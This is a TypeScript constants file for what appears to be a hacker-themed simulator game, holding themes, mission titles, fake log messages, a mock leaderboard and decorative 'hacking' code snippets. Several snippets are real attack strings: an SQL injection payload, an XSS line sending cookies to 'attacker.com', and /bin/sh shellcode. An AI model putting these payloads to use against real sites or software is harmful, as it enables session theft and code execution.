import type { Difficulty, RankEntry, ThemeName } from '../types';

export const DIFFICULTY_CONFIG: Record<
  Difficulty,
  { label: string; color: string; bgColor: string; repReward: number; timeMs: number }
> = {
  EASY: {
    label: 'EASY',
    color: '#00ff41',
    bgColor: 'rgba(0, 255, 65, 0.1)',
    repReward: 10,
    timeMs: 2000,
  },
  MEDIUM: {
    label: 'MEDIUM',
    color: '#00f0ff',
    bgColor: 'rgba(0, 240, 255, 0.1)',
    repReward: 25,
    timeMs: 3500,
  },
  HARD: {
    label: 'HARD',
    color: '#ffaa00',
    bgColor: 'rgba(255, 170, 0, 0.1)',
    repReward: 60,
    timeMs: 5000,
  },
  CRITICAL: {
    label: 'CRITICAL',
    color: '#ff0040',
    bgColor: 'rgba(255, 0, 64, 0.1)',
    repReward: 150,
    timeMs: 7000,
  },
};

export const THEMES: Record<
  ThemeName,
  {
    name: string;
    primary: string;
    secondary: string;
    accent: string;
    warn: string;
    alert: string;
    bg: string;
    terminal: string;
    panel: string;
    border: string;
    borderLight: string;
    textDim: string;
  }
> = {
  matrix: {
    name: 'MATRIX',
    primary: '#00ff41',
    secondary: '#00f0ff',
    accent: '#ff00ff',
    warn: '#ffaa00',
    alert: '#ff0040',
    bg: '#050505',
    terminal: '#0a0a0f',
    panel: '#111118',
    border: '#1a1a2e',
    borderLight: '#2a2a3e',
    textDim: '#6b7280',
  },
  cyber: {
    name: 'CYBER',
    primary: '#00f0ff',
    secondary: '#0080ff',
    accent: '#ff00ff',
    warn: '#ffaa00',
    alert: '#ff4444',
    bg: '#050a14',
    terminal: '#0a1525',
    panel: '#0f1d33',
    border: '#1a3050',
    borderLight: '#2a5080',
    textDim: '#6b8cae',
  },
  alert: {
    name: 'RED TEAM',
    primary: '#ff0040',
    secondary: '#ff4400',
    accent: '#ffaa00',
    warn: '#ffcc00',
    alert: '#ff0000',
    bg: '#140505',
    terminal: '#1f0a0a',
    panel: '#2a1111',
    border: '#3e1a1a',
    borderLight: '#5e2a2a',
    textDim: '#ae6b6b',
  },
  ghost: {
    name: 'GHOST',
    primary: '#e0e0e0',
    secondary: '#a0a0a0',
    accent: '#ffffff',
    warn: '#ffaa00',
    alert: '#ff4444',
    bg: '#0a0a0a',
    terminal: '#111111',
    panel: '#1a1a1a',
    border: '#2a2a2a',
    borderLight: '#3a3a3a',
    textDim: '#888888',
  },
};

export const SERVER_PREFIXES = [
  'NEXUS', 'OMEGA', 'ALPHA', 'DELTA', 'ZETA', 'PHANTOM',
  'GHOST', 'VIPER', 'RAPTOR', 'TITAN', 'NEON', 'SHADOW',
  'CYBER', 'VOID', 'FLUX', 'PULSE', 'CORE', 'SENTRY',
];

export const SERVER_SUFFIXES = [
  'CORP', 'NET', 'SYS', 'SEC', 'DATA', 'HOST',
  'NODE', 'GRID', 'LINK', 'HUB', 'BASE', 'PORT',
];

export const DAILY_INTEL_TEMPLATES: { title: string; difficulty: Difficulty }[] = [
  { title: 'Scan network perimeter for vulnerabilities', difficulty: 'EASY' },
  { title: 'Update firewall signatures database', difficulty: 'EASY' },
  { title: 'Decrypt backlog protocol packets', difficulty: 'MEDIUM' },
  { title: 'Breach secondary authentication layer', difficulty: 'MEDIUM' },
  { title: 'Trace encrypted data exfiltration route', difficulty: 'HARD' },
  { title: 'Execute zero-day exploit on hardened target', difficulty: 'HARD' },
  { title: 'Infiltrate mainframe air-gapped network', difficulty: 'CRITICAL' },
  { title: 'Decrypt quantum-resistant cipher vault', difficulty: 'CRITICAL' },
  { title: 'Bypass biometric security scanner array', difficulty: 'MEDIUM' },
  { title: 'Plant persistent backdoor in kernel space', difficulty: 'HARD' },
  { title: 'Analyze malware sample sandbox output', difficulty: 'EASY' },
  { title: 'Escalate privileges on compromised host', difficulty: 'MEDIUM' },
];

export const HACKING_CODE_SNIPPETS = [
  'import hashlib, socket, sys',
  'def brute_force(target_hash, charset):',
  '    for attempt in generate_permutations(charset):',
  '        if hashlib.sha256(attempt).hexdigest() == target_hash:',
  '            return attempt',
  'class PacketInjector:',
  '    def __init__(self, interface="eth0"):',
  '        self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)',
  '    def craft_payload(self, data, dest_mac):',
  '        header = b"\\x00\\x00\\x00\\x00\\x00\\x00" + dest_mac',
  '        return header + data.ljust(64, b"\\x00")',
  'async def bypass_firewall(ip, port=443):',
  '    session = await establish_tunnel(ip, port)',
  '    if session.handshake_complete:',
  '        await session.inject_payload("\\x90\\x90\\x90\\x90")',
  'def decrypt_rsa(ciphertext, private_key):',
  '    return pow(ciphertext, private_key.d, private_key.n)',
  '# Exploit CVE-2024-XXXX - Buffer Overflow',
  'buffer = b"A" * 256 + p32(0x08048484)',
  'sock.send(buffer + shellcode)',
  'class ZeroDayExploit:',
  '    def escalate_privileges(self):',
  '        return os.setuid(0)',
  'trace_route = subprocess.run(["traceroute", target], capture_output=True)',
  'nmap_scan = f"nmap -sS -p- {target_ip} -T4"',
  'sql_payload = "\' OR 1=1 UNION SELECT * FROM users--"',
  'xss_vector = "<script>fetch(\'http://attacker.com/?c=\'+document.cookie)</script>"',
  'key = RSA.generate(2048, Random.new().read)',
  'cipher = AES.new(session_key, AES.MODE_GCM)',
  'nonce = cipher.nonce',
  'ciphertext, tag = cipher.encrypt_and_digest(plaintext)',
  'def man_in_the_middle(packet):',
  '    if packet.haslayer(TCP) and packet[TCP].flags == "S":',
  '        send(IP(dst=packet[IP].src)/TCP(dport=packet[TCP].sport, flags="SA"))',
  'shellcode = "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"',
  'rop_chain = [pop_rdi, bin_sh_addr, system_addr]',
  'heap_spray = jsstring.repeat(0x10000)',
  'JIT spray: for(i=0;i<0x1000;i++) func[i] = new Function("return "+i)',
];

export const HACKING_LOGS = {
  info: [
    'Initializing handshake protocol...',
    'Scanning open ports on target...',
    'Analyzing firewall rule set...',
    'Establishing encrypted tunnel...',
    'Fetching target system metadata...',
    'Running vulnerability assessment...',
    'Bypassing intrusion detection...',
    'Allocating memory for payload...',
  ],
  warning: [
    'ALERT: IDS signature matched - evading...',
    'WARNING: Rate limit detected - throttling...',
    'CAUTION: Honeypot detected - rerouting...',
    'NOTICE: Connection unstable - retrying...',
  ],
  success: [
    'SUCCESS: Handshake established',
    'SUCCESS: Port 22/tcp OPEN',
    'SUCCESS: Firewall rule bypassed',
    'SUCCESS: Payload delivered',
    'SUCCESS: Root access obtained',
    'SUCCESS: Data exfiltration complete',
    'SUCCESS: Tracks covered',
    'SUCCESS: Firewall Breached',
  ],
  error: [
    'ERROR: Connection reset by peer',
    'ERROR: Authentication failed',
    'ERROR: Payload rejected',
    'ERROR: Session terminated',
  ],
};

export const MOCK_GLOBAL_RANKING: RankEntry[] = [
  { rank: 1, handle: 'PH4NT0M', reputation: 9999, country: 'US', title: 'NetRunner Prime' },
  { rank: 2, handle: 'Z3R0_C00L', reputation: 8750, country: 'RU', title: 'Ghost Protocol' },
  { rank: 3, handle: 'NE0N_BL4D3', reputation: 8200, country: 'JP', title: 'Cyber-Samurai' },
  { rank: 4, handle: 'V0ID_W4LK3R', reputation: 7650, country: 'DE', title: 'Deep Web King' },
  { rank: 5, handle: 'CYPHER_PUNK', reputation: 7200, country: 'BR', title: 'Street Hacker' },
  { rank: 6, handle: 'R4PT0R_EYE', reputation: 6800, country: 'CN', title: 'System Cracker' },
  { rank: 7, handle: 'FLUX_CAPTAIN', reputation: 6400, country: 'UK', title: 'Data Pirate' },
  { rank: 8, handle: 'SH4D0W_RUNNER', reputation: 6100, country: 'KR', title: 'Night Ops' },
  { rank: 9, handle: 'T1T4N_F1ST', reputation: 5800, country: 'IN', title: 'Brute Force' },
  { rank: 10, handle: 'PULS4R_GH0ST', reputation: 5500, country: 'FR', title: 'Silent Breach' },
];

export const LEVEL_TITLES = [
  { min: 0, title: 'Script Kiddie' },
  { min: 100, title: 'Packet Sniffer' },
  { min: 300, title: 'Port Scanner' },
  { min: 600, title: 'Cipher Breaker' },
  { min: 1000, title: 'System Intruder' },
  { min: 1500, title: 'NetRunner' },
  { min: 2500, title: 'Ghost Protocol' },
  { min: 4000, title: 'Cyber-Samurai' },
  { min: 6000, title: 'Deep Web King' },
  { min: 9000, title: 'NetRunner Prime' },
  { min: 12000, title: 'Digital Deity' },
];

export function getLevelTitle(reputation: number): string {
  for (let i = LEVEL_TITLES.length - 1; i >= 0; i--) {
    if (reputation >= LEVEL_TITLES[i].min) {
      return LEVEL_TITLES[i].title;
    }
  }
  return LEVEL_TITLES[0].title;
}

export function calculateLevel(reputation: number): number {
  return Math.floor(Math.sqrt(reputation / 10)) + 1;
}

export function getDailyBonus(difficulty: Difficulty): number {
  return Math.floor(DIFFICULTY_CONFIG[difficulty].repReward * 0.5);
}

export function getWeekKey(date = new Date()): string {
  const d = new Date(date);
  d.setHours(0, 0, 0, 0);
  d.setDate(d.getDate() - d.getDay());
  return d.toISOString().split('T')[0];
}

export function getDateKey(date = new Date()): string {
  return date.toISOString().split('T')[0];
}
